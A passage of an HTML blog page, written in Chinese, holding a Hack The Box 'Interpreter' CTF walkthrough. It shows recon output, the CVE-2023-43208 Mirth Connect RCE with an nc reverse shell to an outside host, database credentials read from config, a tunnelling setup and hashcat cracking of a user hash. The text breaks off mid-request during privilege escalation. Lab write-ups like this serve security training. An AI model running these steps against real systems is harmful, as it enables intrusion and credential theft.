@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar-1080x1080.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar-1080x1080.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar-1080x1080.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l1nk.icu","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Hack The Box [Season10] Interpreter Linux Medium">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Season10] Interpreter WP">
+<meta property="og:url" content="http://l1nk.icu/2026/02/22/Season10-Interpreter/index.html">
+<meta property="og:site_name" content="L1nk&#39;s Blog">
+<meta property="og:description" content="Hack The Box [Season10] Interpreter Linux Medium">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-02-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-21T16:00:00.000Z">
+<meta property="article:author" content="l1nk">
+<meta property="article:tag" content="blog">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://l1nk.icu/2026/02/22/Season10-Interpreter/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://l1nk.icu/2026/02/22/Season10-Interpreter/","path":"2026/02/22/Season10-Interpreter/","title":"[Season10] Interpreter WP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[Season10] Interpreter WP | L1nk's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">L1nk's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Mirth-Connect"><span class="nav-number">2.</span> <span class="nav-text">Web-Mirth Connect</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2023-43208-RCE"><span class="nav-number">2.1.</span> <span class="nav-text">CVE-2023-43208 RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.2.</span> <span class="nav-text">主机信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hash"><span class="nav-number">4.</span> <span class="nav-text">Hash</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="l1nk"
+      src="/images/avatar-1080x1080.png">
+  <p class="site-author-name" itemprop="name">l1nk</p>
+  <div class="site-description" itemprop="description">Vidar-Team Web | Student</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kn1l" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kn1l" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:l1nk@foxmail.com" title="E-Mail → mailto:l1nk@foxmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/l1nkowo" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;l1nkowo" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://www.kinoko.fun/" title="https:&#x2F;&#x2F;www.kinoko.fun&#x2F;" rel="noopener" target="_blank">Kinoko</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://tech.ec3o.fun/" title="https:&#x2F;&#x2F;tech.ec3o.fun&#x2F;" rel="noopener" target="_blank">Ec3o</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://www.z221x.website/" title="https:&#x2F;&#x2F;www.z221x.website&#x2F;" rel="noopener" target="_blank">z221x</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.4db.icu/" title="https:&#x2F;&#x2F;blog.4db.icu&#x2F;" rel="noopener" target="_blank">Fc04dB</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.naclwww.com/" title="https:&#x2F;&#x2F;blog.naclwww.com&#x2F;" rel="noopener" target="_blank">NaCl</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.kiracoon.top/" title="https:&#x2F;&#x2F;blog.kiracoon.top&#x2F;" rel="noopener" target="_blank">Kiracoon</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://mysid.top/" title="https:&#x2F;&#x2F;mysid.top&#x2F;" rel="noopener" target="_blank">mysid</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://l1nk.icu/2026/02/22/Season10-Interpreter/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar-1080x1080.png">
+      <meta itemprop="name" content="l1nk">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L1nk's Blog">
+      <meta itemprop="description" content="Vidar-Team Web | Student">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[Season10] Interpreter WP | L1nk's Blog">
+      <meta itemprop="description" content="Hack The Box [Season10] Interpreter Linux Medium">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [Season10] Interpreter WP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-02-22 00:00:00" itemprop="dateCreated datePublished" datetime="2026-02-22T00:00:00+08:00">2026-02-22</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>1.6k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>6 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">Hack The Box [Season10] Interpreter Linux Medium</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>nmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE   REASON         VERSION</span><br><span class="line">22/tcp  open  ssh       syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)</span><br><span class="line">80/tcp  open  http      syn-ack ttl 63</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.1 404 Not Found</span><br><span class="line">|     Cache-Control: must-revalidate,no-cache,no-store</span><br><span class="line">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="line">|     Content-Length: 458</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=ISO-8859-1&quot;/&gt;</span><br><span class="line">|     &lt;title&gt;Error 404 Not Found&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;&lt;h2&gt;HTTP ERROR 404 Not Found&lt;/h2&gt;</span><br><span class="line">|     &lt;table&gt;</span><br><span class="line">|     &lt;tr&gt;&lt;th&gt;URI:&lt;/th&gt;&lt;td&gt;/nice%20ports%2C/Tri%6Eity.txt%2ebak&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">|     &lt;tr&gt;&lt;th&gt;STATUS:&lt;/th&gt;&lt;td&gt;404&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">|     &lt;tr&gt;&lt;th&gt;MESSAGE:&lt;/th&gt;&lt;td&gt;Not Found&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">|     &lt;tr&gt;&lt;th&gt;SERVLET:&lt;/th&gt;&lt;td&gt;org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-7a56a372&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">|     &lt;/table&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Date: Sat, 21 Feb 2026 19:08:19 GMT</span><br><span class="line">|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Accept-Ranges: bytes</span><br><span class="line">|     Content-Length: 2532</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-store&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Mirth Connect Administrator&lt;/title&gt;</span><br><span class="line">|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot; href=&quot;images/NG_MC_Icon_16x16.png&quot; /&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/bootstrap.css&quot; /&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/main.css&quot; /&gt;</span><br><span class="line">|     &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">|     Break out of frame if inside a frame. */</span><br><span class="line">|     (window != window.top) &#123;</span><br><span class="line">|     window.top.location = window.location;</span><br><span class="line">|     &lt;/script&gt;</span><br><span class="line">|     &lt;script type=&quot;text/javascript&quot; sr</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Date: Sat, 21 Feb 2026 19:08:19 GMT</span><br><span class="line">|     Allow: GET, HEAD, TRACE, OPTIONS</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     HTTP/1.1 505 Unknown Version</span><br><span class="line">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="line">|     Content-Length: 58</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;</span><br><span class="line">|   X11Probe: </span><br><span class="line">|     HTTP/1.1 400 Illegal character CNTL=0x0</span><br><span class="line">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="line">|     Content-Length: 69</span><br><span class="line">|     Connection: close</span><br><span class="line">|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 62BE2608829EE4917ACB671EF40D5688</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD TRACE OPTIONS</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Mirth Connect Administrator</span><br><span class="line">443/tcp open  ssl/https syn-ack ttl 63</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.1 404 Not Found</span><br><span class="line">|     Cache-Control: must-revalidate,no-cache,no-store</span><br><span class="line">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="line">|     Content-Length: 458</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=ISO-8859-1&quot;/&gt;</span><br><span class="line">|     &lt;title&gt;Error 404 Not Found&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;&lt;h2&gt;HTTP ERROR 404 Not Found&lt;/h2&gt;</span><br><span class="line">|     &lt;table&gt;</span><br><span class="line">|     &lt;tr&gt;&lt;th&gt;URI:&lt;/th&gt;&lt;td&gt;/nice%20ports%2C/Tri%6Eity.txt%2ebak&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">|     &lt;tr&gt;&lt;th&gt;STATUS:&lt;/th&gt;&lt;td&gt;404&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">|     &lt;tr&gt;&lt;th&gt;MESSAGE:&lt;/th&gt;&lt;td&gt;Not Found&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">|     &lt;tr&gt;&lt;th&gt;SERVLET:&lt;/th&gt;&lt;td&gt;org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-7a56a372&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">|     &lt;/table&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Date: Sat, 21 Feb 2026 19:08:26 GMT</span><br><span class="line">|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Accept-Ranges: bytes</span><br><span class="line">|     Content-Length: 2532</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-store&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Mirth Connect Administrator&lt;/title&gt;</span><br><span class="line">|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot; href=&quot;images/NG_MC_Icon_16x16.png&quot; /&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/bootstrap.css&quot; /&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/main.css&quot; /&gt;</span><br><span class="line">|     &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">|     Break out of frame if inside a frame. */</span><br><span class="line">|     (window != window.top) &#123;</span><br><span class="line">|     window.top.location = window.location;</span><br><span class="line">|     &lt;/script&gt;</span><br><span class="line">|     &lt;script type=&quot;text/javascript&quot; sr</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Date: Sat, 21 Feb 2026 19:08:27 GMT</span><br><span class="line">|_    Allow: GET, HEAD, TRACE, OPTIONS</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD TRACE OPTIONS</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Mirth Connect Administrator</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web-Mirth-Connect"><a href="#Web-Mirth-Connect" class="headerlink" title="Web-Mirth Connect"></a>Web-Mirth Connect</h2><h3 id="CVE-2023-43208-RCE"><a href="#CVE-2023-43208-RCE" class="headerlink" title="CVE-2023-43208 RCE"></a>CVE-2023-43208 RCE</h3><p>查看应用 <code>Mirth Connect</code> 的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -k -H &#x27;X-Requested-With: test&#x27; https://$IP:443/api/server/version</span><br><span class="line">4.4.0</span><br></pre></td></tr></table></figure>
+
+<p>利用 <a target="_blank" rel="noopener" href="https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc">jakabakos&#x2F;CVE-2023-43208-mirth-connect-rce-poc</a> 反弹 shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2023-43208.py -u &quot;https://$IP&quot; -c &#x27;nc 10.10.16.2 6666 -e /bin/bash&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p><code>conf/mirth.properties</code> 拿到数据库信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">database = mysql</span><br><span class="line">database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod</span><br><span class="line"># database credentials</span><br><span class="line">database.username = mirthdb</span><br><span class="line">database.password = MirthPass123!</span><br></pre></td></tr></table></figure>
+
+<p>搭建代理</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./proxy -selfcert</span><br><span class="line">./agent -connect 10.10.16.2:11601 -ignore-cert -retry</span><br><span class="line"></span><br><span class="line">session</span><br><span class="line">ifcreate --name ligolo</span><br><span class="line">route_add --name ligolo --route 240.0.0.1/32</span><br><span class="line">start --tun ligolo</span><br></pre></td></tr></table></figure>
+
+<p>连接数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u mirthdb -p&#x27;MirthPass123!&#x27; -h 240.0.0.1 -D mc_bdd_prod</span><br></pre></td></tr></table></figure>
+
+<p>查找用户密码 hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from PERSON;</span><br><span class="line">+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+----------------------+------+---------------+----------------+-------------+</span><br><span class="line">| ID | USERNAME | FIRSTNAME | LASTNAME | ORGANIZATION | INDUSTRY | EMAIL | PHONENUMBER | DESCRIPTION | LAST_LOGIN          | GRACE_PERIOD_START | STRIKE_COUNT | LAST_STRIKE_TIME | LOGGED_IN            | ROLE | COUNTRY       | STATETERRITORY | USERCONSENT |</span><br><span class="line">+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+----------------------+------+---------------+----------------+-------------+</span><br><span class="line">|  2 | sedric   |           |          |              | NULL     |       |             |             | 2025-09-21 17:56:02 | NULL               |            0 | NULL             | 0x00                 | NULL | United States | NULL           |           0 |</span><br><span class="line">+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+----------------------+------+---------------+----------------+-------------+</span><br><span class="line">1 row in set (0.19 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from PERSON_PASSWORD;</span><br><span class="line">+-----------+----------------------------------------------------------+---------------------+</span><br><span class="line">| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |</span><br><span class="line">+-----------+----------------------------------------------------------+---------------------+</span><br><span class="line">|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |</span><br><span class="line">+-----------+----------------------------------------------------------+---------------------+</span><br><span class="line">1 row in set (0.19 sec)</span><br></pre></td></tr></table></figure>
+
+<p>我们拿到用户 <code>sedric</code> 的密码哈希 <code>u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==</code></p>
+<p>前 8 字节是 salt 后 32 字节是 hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=&quot; &gt; hash.txt</span><br><span class="line">hashcat -m 10900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>爆破得到 <code>snowflake1</code> 用户名为 <code>sedric</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sedric@interpreter:~$ cat user.txt</span><br><span class="line">0f70fa396b1529bc5effc018f7840e5c</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看端口发现有个 <code>54321</code> 端口开着，应该是个 web 应用</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">curl 240.0.0.1:54321 -v -H <span class="string">&quot;Host: interpreter.htb&quot;</span></span><br><span class="line">*   Trying 240.0.0.1:54321...</span><br><span class="line">* Connected to 240.0.0.1 (240.0.0.1) port 54321 (#0)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: interpreter.htb</span><br><span class="line">&gt; User-Agent: curl/7.81.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not 